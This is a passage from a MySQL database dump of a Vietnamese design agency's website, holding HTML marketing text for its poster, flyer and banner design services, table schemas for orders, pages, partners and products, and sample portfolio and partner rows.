style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy n&ecirc;n khi muốn thiết kế Poster tốt nhất doanh nghiệp n&ecirc;n t&igrave;m tới những đơn vị chuy&ecirc;n nghiệp v&agrave; uy t&iacute;n như Brity để được n&acirc;ng cao hiệu quả truyền th&ocirc;ng tốt nhất, được cẩn trọng trong từng qu&aacute; tr&igrave;nh l&ecirc;n &yacute; tưởng, nội dung, s&aacute;ng tạo trong thiết kế nhằm mang tới những mẫu Poster độc đ&aacute;o, chuy&ecirc;n nghiệp v&agrave; s&aacute;ng tạo.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Thiết kế Poster tại Brity c&oacute; những g&igrave; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Kh&aacute;ch h&agrave;ng lựa chọn thiết kế Poster tại Brity lu&ocirc;n được tư vấn chu đ&aacute;o, sản phẩm ho&agrave;n thiện theo đ&uacute;ng mong muốn của kh&aacute;ch h&agrave;ng, trong đ&oacute; dịch vụ thiết kế Poster tại Brity c&ograve;n c&oacute; đặc điểm :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">- Kh&ocirc;ng giới hạn số lần hiệu chỉnh thiết kế, dịch vụ của ch&uacute;ng t&ocirc;i chỉ kết th&uacute;c khi kh&aacute;ch h&agrave;ng đ&atilde; h&agrave;i l&ograve;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">- Bạn c&oacute; thể trực tiếp lựa chọn người thiết kế tại văn ph&ograve;ng Brity, GCO.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">- Uy t&iacute;n thiết kế đồ họa quảng c&aacute;o Brity được đ&ocirc;ng đảo kh&aacute;ch h&agrave;ng khẳng định</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">- Kh&aacute;ch h&agrave;ng được tư vấn tận t&igrave;nh một c&aacute;ch chuy&ecirc;n nghiệp để x&acirc;y dựng v&agrave; ph&aacute;t triển thương hiệu</span></p>\r\n<ul>\r\n<li style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Khi sử dụng dịch vụ thiết kế poster, tờ rơi, tờ gấp tại Brity, kh&aacute;ch h&agrave;ng được hỗ trợ tư vấn thiết kế logo v&agrave; bộ nhận diện thương hiệu ho&agrave;n to&agrave;n miễn ph&iacute;.</span></li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/13_4.jpg\" alt=\"\" width=\"1500\" height=\"1125\" /></span><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;<img src=\"http://brity.vn/upload/14_1.jpg\" alt=\"\" width=\"1000\" height=\"701\" /></span></p>\r\n<p>&nbsp;</p>\r\n<p><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/15_1.jpg\" alt=\"\" width=\"1200\" height=\"789\" /></span></p>', NULL, 1, 0, 58, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 21, '2018-07-12 16:25:38', '', '2018-07-12 09:25:38'),
(77, 'Flyer', 'Poster', 'flyer', 'poster', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Nếu doanh nghiệp bạn đang muốn t&igrave;m kiếm đơn vị thiết kế tờ rơi quảng c&aacute;o đẹp mắt&nbsp; v&agrave; chất lượng th&igrave; Brity ch&iacute;nh l&agrave; đơn vị h&agrave;ng đầu nhận được sự tin cậy từ đ&ocirc;ng đảo kh&aacute;ch h&agrave;ng. Tại Brity lu&ocirc;n cung cấp tới kh&aacute;ch h&agrave;ng dịch vụ thiết kế tờ rơi nhanh ch&oacute;ng, độc đ&aacute;o, bắt mắt nhằm tăng cường thu h&uacute;t người d&ugrave;ng v&agrave; th&uacute;c đẩy hiệu quả kinh doanh cho doanh nghiệp bạn.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/18_3.jpg\" alt=\"\" width=\"2000\" height=\"1350\" /></span></p>\r\n<h2 style=\"text-align: justify;\">&nbsp;</h2>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Flyer l&agrave; g&igrave; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Flyer hay c&ograve;n được gọi bằng c&aacute;i t&ecirc;n phổ th&ocirc;ng ch&iacute;nh l&agrave; tờ rơi, bản in quảng c&aacute;o được thiết kế để dễ d&agrave;ng truyền tải th&ocirc;ng tin tới kh&aacute;ch h&agrave;ng hơn, trong đ&oacute; tờ rơi thường c&oacute; 1 trang 2 mặt in th&ocirc;ng tin c&ugrave;ng h&igrave;nh ảnh quảng c&aacute;o.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Mọi th&ocirc;ng tin được in trong tờ rơi thường y&ecirc;u cầu phải x&uacute;c t&iacute;ch, ngắn gọn , thậm ch&iacute; c&oacute; vai tr&ograve; tương tự với một tờ poster loại nhỏ, k&iacute;ch thước cũng nhỏ, in với số lượng lớn để giảm thiểu chi ph&iacute; in ấn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&acirc;y cũng l&agrave; l&yacute; do trước khi in tờ rơi doanh nghiệp n&ecirc;n t&igrave;m tới dịch vụ thiết kế chuy&ecirc;n nghiệp để x&acirc;y dựng nội dung chắt lọc, giảm thiểu th&ocirc;ng tin dạng text, tăng cường h&igrave;nh ảnh bắt mắt c&ugrave;ng c&aacute;c đối tượng thiết kế kh&aacute;c nhằm thu h&uacute;t người d&ugrave;ng.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Thiết kế flyer tại Brity c&oacute; g&igrave; đặc biệt ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Dịch vụ thiết kế tờ rơi tại Brity được đ&aacute;nh gi&aacute; l&agrave; dịch vụ h&agrave;ng đầu được đ&ocirc;ng đảo kh&aacute;ch h&agrave;ng tin cậy v&agrave; sử dụng, trong đ&oacute; với ti&ecirc;u ch&iacute; đảm bảo thiết kế chất lương, kiểm so&aacute;t tốt chất lượng in, Brity lu&ocirc;n cam kết mang tới cho kh&aacute;ch h&agrave;ng những bản thiết kế tờ rơi bắt mắt nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Những thiết kế tờ rơi tại Brity ho&agrave;n to&agrave;n đề cao t&iacute;nh đơn giản, sử dụng một v&agrave;i t&ocirc;ng chủ đạo v&agrave; kh&ocirc;ng hề l&ograve;e loẹt về m&agrave;u sắc, font chữ sử dụng hiện đại, bố cục mảng miếng trong thiết kế được tận dụng tối ưu.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra tờ rơi được Brity thiết được d&ugrave;ng đườn d&oacute;ng để tạo sự thẳng h&agrave;ng, ngay ngắn giữa c&aacute;c phần tử trong thiết kế, tận dụng tối đa hiệu quả &aacute;nh s&aacute;ng, 3D, gradient</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Brity lu&ocirc;n sử dụng vector trong những trường hợp c&oacute; thể sử dụng được để tăng độ n&eacute;t, với th&ocirc;ng số m&agrave;u đưa về hệ 4 m&agrave;u CMYK</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra tờ rơi được thiết kế c&ograve;n đảm bảo căn chỉnh nền, tr&agrave;n lề, ch&uacute; &yacute; khoảng c&aacute;ch an to&agrave;n của chữ. Lựa chọn h&igrave;nh ảnh c&oacute; độ ph&acirc;n giải cao, m&agrave;u sắc ảnh ph&ugrave; hợp với t&ocirc;ng m&agrave;u thiết kế.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Kh&aacute;ch h&agrave;ng khi chọn lựa thiết kế tờ rơi tại Brity lu&ocirc;n đảm bảo được thiết kế nhanh ch&oacute;ng, tiện dụng v&agrave; đảm bảo mẫu tờ rơi đẹp mắt, thu h&uacute;t kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/16_1.jpg\" alt=\"\" width=\"1000\" height=\"1415\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/Mothers-day_a5.jpg\" alt=\"\" width=\"1710\" height=\"2492\" /></p>', NULL, 1, 0, 58, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 22, '2018-07-12 16:39:42', '', '2018-07-12 09:39:42'),
(78, 'Standy, Banner', 'Standy, Banner', 'standy-banner', 'standy-banner', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bất cứ doanh nghiệp n&agrave;o đều cần thiết kế Standy, Banner để phục vụ trong c&aacute;c buổi lễ khai trương, kh&aacute;nh th&agrave;nh, giới thiệu sản phẩm, dịch vụ, hoặc trưng b&agrave;y ở triển l&atilde;m, hội trợ&hellip;. Đ&acirc;y được xem l&agrave; một trong những hoạt động quảng c&aacute;o, kinh doanh v&agrave; tiếp thị kh&ocirc;ng thể thiếu của mọi doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy việc t&igrave;m chọn một đơn vị uy t&iacute;n như Brity để thiết kế Standy, Banner l&agrave; giải ph&aacute;p ho&agrave;n hảo cho doanh nghiệp của bạn trong thời điểm hiện tại</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/23_1.jpg\" alt=\"\" width=\"1024\" height=\"650\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Tại sao doanh nghiệp của bạn cần thiết kế Standy, Banner ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tr&ecirc;n thực chất Standy, Banner ch&iacute;nh l&agrave; một trong những vật tư quảng c&aacute;o được nhiều người quan t&acirc;m hiện nay, mang lại nhiều lợi &iacute;ch quảng b&aacute; h&igrave;nh ảnh cho doanh nghiệp cũng như sự tiện lợi cho người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Việc thiết kế Standy, Banner kh&ocirc;ng chỉ gi&uacute;p doanh nghiệp x&acirc;y dựng thương hiệu, h&igrave;nh ảnh của m&igrave;nh một c&aacute;ch ho&agrave;n hảo nhất m&agrave; c&ograve;n l&agrave; giải ph&aacute;p truyền th&ocirc;ng, marketing gi&aacute; trị cho doanh nghiệp, từ đ&oacute; đưa h&igrave;nh ảnh của doanh nghiệp tới người ti&ecirc;u d&ugrave;ng, n&acirc;ng cao hiệu quả truyền th&ocirc;ng v&agrave; quảng b&aacute;, gi&uacute;p nhiều người d&ugrave;ng biết tới dịch vụ, sản phẩm của doanh nghiệp hiện nay.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong đ&oacute; t&ugrave;y theo từng nhu cầu kh&aacute;c nhau m&agrave; doanh nghiệp cần thiết kế c&aacute;c mẫu m&atilde; Standy, Banner kh&aacute;c nhau cho sản phẩm dịch vụ của m&igrave;nh, đảm bảo t&iacute;nh thương hiệu v&agrave; sự độc đ&aacute;o, thu h&uacute;t người d&ugrave;ng, đ&acirc;y cũng l&agrave; l&yacute; do kh&aacute;ch h&agrave;ng khi muốn thiết kế Standy, Banner đều cần t&igrave;m tới c&aacute;c đơn vị thiết kế chuy&ecirc;n nghiệp, uy t&iacute;n như Brity để đảm bảo sở hữu những mẫu thiết kế Standy, Banner ho&agrave;n hảo nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. L&yacute; do n&agrave;o kh&aacute;ch h&agrave;ng n&ecirc;n chọn thiết kế Standy, Banner tại Brity ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bất cứ kh&aacute;ch h&agrave;ng n&agrave;o từng sử dụng c&aacute;c dịch vụ thiết kế tại Brity đều kh&ocirc;ng thể phủ nhận rằng ch&uacute;ng t&ocirc;i l&agrave; đơn vị uy t&iacute;n, chuy&ecirc;n nghiệp trong thiết kế c&aacute;c ấn phẩm, Standy, Banner, logo, hồ sơ doanh nghiệp, bộ nhận diện thương hiệu&hellip;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong đ&oacute; với ti&ecirc;u ch&iacute; b&aacute;n h&agrave;ng chất lượng, dịch vụ chuy&ecirc;n nghiệp v&agrave; gi&aacute; cả cạnh tranh, kh&aacute;ch h&agrave;ng khi thiết kế Standy, Banner tại Brity lu&ocirc;n được lựa chọn nhiều mẫu m&atilde; đa dạng, thiết kế theo đ&uacute;ng y&ecirc;u cầu kh&aacute;ch h&agrave;ng, đưa tới những bản vẽ ho&agrave;n thiện nhất nhằm phục vụ tốt nhất mọi nhu cầu của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với đội ngũ thiết kế c&ugrave;ng kỹ thuật vi&ecirc;n chuy&ecirc;n nghiệp, t&acirc;m huyết lu&ocirc;n đảm bảo mang tới cho kh&aacute;ch h&agrave;ng mẫu thiết kế ho&agrave;n hảo , đ&uacute;ng hẹn, đ&aacute;p ứng tối đa mọi y&ecirc;u cầu của kh&aacute;ch h&agrave;ng khi tới đ&acirc;y.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để được tư vấn th&ecirc;m v&agrave; c&oacute; b&aacute;o gi&aacute; cụ thể theo y&ecirc;u cầu, xin qu&yacute; kh&aacute;ch vui l&ograve;ng li&ecirc;n hệ trực tiếp tới bộ phận chăm s&oacute;c kh&aacute;ch h&agrave;ng của Brity.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/19_2.jpg\" alt=\"\" width=\"1400\" height=\"1050\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/20_1.jpg\" alt=\"\" width=\"2000\" height=\"2000\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/22_1.jpg\" alt=\"\" width=\"1024\" height=\"1100\" /></span></p>', NULL, 1, 0, 58, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 23, '2018-07-12 17:20:04', '', '2018-07-12 10:20:04');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `orders`
--

CREATE TABLE `orders` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `desc` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `com` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `status` int(11) NOT NULL,
  `stt` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `order_detail`
--

CREATE TABLE `order_detail` (
  `id` int(10) UNSIGNED NOT NULL,
  `id_user` int(11) NOT NULL,
  `id_order` int(11) NOT NULL,
  `id_product` int(11) NOT NULL,
  `photo` text COLLATE utf8_unicode_ci NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `hoten` text COLLATE utf8_unicode_ci NOT NULL,
  `price` int(11) NOT NULL,
  `qty` text COLLATE utf8_unicode_ci NOT NULL,
  `totalprice` int(11) NOT NULL,
  `tonggia` int(11) NOT NULL,
  `donhang` longtext COLLATE utf8_unicode_ci NOT NULL,
  `status` int(11) NOT NULL,
  `stt` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `order_status`
--

CREATE TABLE `order_status` (
  `id` int(10) UNSIGNED NOT NULL,
  `tinhtrang` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `pages`
--

CREATE TABLE `pages` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `title` text COLLATE utf8_unicode_ci NOT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `desc` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `description` longtext COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL,
  `com` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `partner`
--

CREATE TABLE `partner` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `url` text COLLATE utf8_unicode_ci,
  `photo` text COLLATE utf8_unicode_ci,
  `desc` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `com` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `partner`
--

INSERT INTO `partner` (`id`, `name`, `name_en`, `url`, `photo`, `desc`, `content`, `com`, `status`, `created_at`, `updated_at`) VALUES
(3, 'Đối tác 1', NULL, NULL, '1530156485_4.jpg', NULL, NULL, 'doi-tac', 1, '2017-11-02 00:37:56', '2018-06-27 20:28:05'),
(4, 'Đối tác 2', NULL, NULL, '1525763973_2.jpg', NULL, NULL, 'doi-tac', 1, '2017-11-02 00:39:46', '2018-05-08 00:19:33'),
(5, 'Đối tác 3', NULL, 'https://behe.vn/', '1525764193_3.jpg', NULL, NULL, 'doi-tac', 1, '2017-11-02 00:39:55', '2018-10-15 02:42:50'),
(6, 'Đối tác 4', NULL, NULL, '1525764329_5.jpg', NULL, NULL, 'doi-tac', 1, '2017-11-02 00:40:10', '2018-05-08 00:25:29'),
(7, 'Đối tác 5', NULL, NULL, '1525764400_6.jpg', NULL, NULL, 'doi-tac', 1, '2017-11-02 00:40:20', '2018-05-08 00:26:40'),
(8, 'Đối tác 6', NULL, 'https://gco.vn/', '1525764466_7.jpg', NULL, NULL, 'doi-tac', 1, '2017-11-02 00:40:29', '2018-07-14 08:30:57'),
(11, 'Beyou', 'Beyou', NULL, '1525764575_8.jpg', NULL, NULL, 'doi-tac', 1, '2018-05-08 00:29:35', '2018-05-08 00:29:35'),
(12, '365', '365', NULL, '1525764641_9.jpg', NULL, NULL, 'doi-tac', 1, '2018-05-08 00:30:41', '2018-05-08 00:30:41'),
(13, 'nhung', 'nhung', NULL, '1525764705_10.jpg', NULL, NULL, 'doi-tac', 1, '2018-05-08 00:31:45', '2018-05-08 00:31:45'),
(14, '99', '99', NULL, '1525764759_11.jpg', NULL, NULL, 'doi-tac', 1, '2018-05-08 00:32:39', '2018-05-08 00:32:39'),
(15, 'GNR', 'GNR', NULL, '1525764854_12.jpg', NULL, NULL, 'doi-tac', 1, '2018-05-08 00:34:14', '2018-05-08 00:34:14'),
(16, 'Luma', 'Luma', NULL, '1525765003_13.jpg', NULL, NULL, 'doi-tac', 1, '2018-05-08 00:36:43', '2018-05-08 00:36:43');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `partners`
--

CREATE TABLE `partners` (
  `id` int(11) NOT NULL,
  `photo` text,
  `name` varchar(250) DEFAULT NULL,
  `link` varchar(250) DEFAULT NULL,
  `status` int(11) DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `products`
--

CREATE TABLE `products` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `cate_id` int(11) UNSIGNED NOT NULL DEFAULT '0',
  `code` text COLLATE utf8_unicode_ci,
  `stt` int(11) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `alias_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `price` int(11) NOT NULL DEFAULT '0',
  `sale` int(11) DEFAULT '0',
  `price_old` int(11) DEFAULT '0',
  `mota` longtext COLLATE utf8_unicode_ci,
  `mota_en` text CHARACTER SET utf8,
  `content` longtext COLLATE utf8_unicode_ci,
  `content_en` text CHARACTER SET utf8,
  `thuonghieu` text COLLATE utf8_unicode_ci,
  `tinhtrang` int(11) NOT NULL DEFAULT '1',
  `baohanh` text COLLATE utf8_unicode_ci,
  `properties` text CHARACTER SET utf8,
  `model` text COLLATE utf8_unicode_ci,
  `namsanxuat` text COLLATE utf8_unicode_ci,
  `ratepoint` int(2) DEFAULT NULL,
  `quatang` text COLLATE utf8_unicode_ci,
  `quatang_en` text COLLATE utf8_unicode_ci,
  `huongdan` text COLLATE utf8_unicode_ci,
  `huongdan_en` text COLLATE utf8_unicode_ci,
  `vanchuyen` text COLLATE utf8_unicode_ci,
  `noibat` int(11) NOT NULL DEFAULT '0',
  `big` int(1) NOT NULL DEFAULT '0',
  `spbc` int(11) NOT NULL DEFAULT '0',
  `status` int(11) NOT NULL DEFAULT '1',
  `type_view` int(11) DEFAULT '0',
  `title` text COLLATE utf8_unicode_ci,
  `title_en` text CHARACTER SET utf8,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `keyword_en` text CHARACTER SET utf8,
  `description` longtext COLLATE utf8_unicode_ci,
  `description_en` text CHARACTER SET utf8,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `products`
--

INSERT INTO `products` (`id`, `user_id`, `cate_id`, `code`, `stt`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `price`, `sale`, `price_old`, `mota`, `mota_en`, `content`, `content_en`, `thuonghieu`, `tinhtrang`, `baohanh`, `properties`, `model`, `namsanxuat`, `ratepoint`, `quatang`, `quatang_en`, `huongdan`, `huongdan_en`, `vanchuyen`, `noibat`, `big`, `spbc`, `status`, `type_view`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `created_at`, `updated_at`) VALUES
(13, 5, 1, NULL, 11, 'BEHE BRAND', NULL, 'behe-brand', '', '1539663015_001.jpg', 0, 0, 0, '<p>Kh&aacute;ch h&agrave;ng: C&Ocirc;NG TY TNHH BEHE VIỆT NAM</p>\r\n<p>Địa chỉ: Ho&agrave;ng Mai, H&agrave; Nội</p>\r\n<p>Logo, Brand Identity, Packaging, Brand Application</p>', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '<p><strong>BEHE VIỆT NAM</strong></p>\r\n<p>Hoạt động trong lĩnh vực l&agrave;m đẹp v&agrave; chăm s&oacute;c sức khỏe</p>\r\n<p>Logo của BEHE h&igrave;nh th&agrave;nh dựa tr&ecirc;n 4 yếu tố, cũng l&agrave; 4 gi&aacute; trị cốt l&otilde;i:</p>\r\n<p>Vẻ Đẹp</p>\r\n<p>Sức khỏe</p>\r\n<p>Tự nhi&ecirc;n</p>\r\n<p>T&acirc;m Đức</p>', NULL, 'Logo, Brand Identity, Packaging, Brand Application', NULL, NULL, 0, 1, 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-10-16 08:12:40', '2018-10-16 01:12:40'),
(14, 5, 1, NULL, 12, 'Long Anh Hotel', NULL, 'long-anh-hotel', '', '1539751857_Untitled-4.jpg', 0, 0, 0, '<p>Kh&aacute;ch h&agrave;ng: <span style=\"font-size: 14pt;\">Kh&aacute;ch sạn Long Anh</span></p>\r\n<p>Địa chỉ: Số 01 - 05 Phố Cao Thắng - Phường Điện Bi&ecirc;n - TP Thanh H&oacute;a</p>\r\n<p>Logo, Brand identity, Brand application</p>', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '<p><span style=\"font-size: 14pt;\">Kh&aacute;ch sạn Long Anh</span></p>\r\n<p>Kh&aacute;ch sạn Long Anh l&agrave; một trong những kh&aacute;ch sạn 3 sao lớn nhất tại th&agrave;nh phố Thanh H&oacute;a.</p>\r\n<p>Bao gồm hệ thống 70 ph&ograve;ng nghỉ được thiết kế theo phong c&aacute;ch b&aacute;n cổ đi&ecirc;̉n hiện đại mang đến cho kh&aacute;ch h&agrave;ng kh&ocirc;ng gian nghỉ dưỡng tiện nghi và sang trọng</p>', NULL, 'Logo, Brand identity, Brand application', NULL, NULL, 0, 0, 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-10-17 08:01:50', '2018-10-17 01:01:50'),
(15, 5, 1, NULL, 13, 'GCO GROUP', NULL, 'gco-group', '', '1539761610_Untitled-1.jpg', 0, 0, 0, '<p><span style=\"font-size: 12pt;\">Kh&aacute;ch h&agrave;ng: GCO Group</span></p>\r\n<p><span style=\"font-size: 12pt;\">Địa chỉ: H&agrave; Nội</span></p>\r\n<p><span style=\"font-size: 12pt;\">Brand Applications, Visual Identity System</span></p>', NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '<h4><span style=\"color: #000000;\"><strong>BRANDING GCO GROUP</strong></span></h4>\r\n<p>GCO Ads</p>\r\n<p>GCO Softwave</p>\r\n<p>GCO Media</p>\r\n<p>GCO Educaiton</p>\r\n<p>GCO Creative</p>', NULL, 'Visual Identity, Brand Application, Ui Design', NULL, NULL, 0, 0, 0, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2018-10-17 07:33:30', '2018-10-17 00:33:30'),
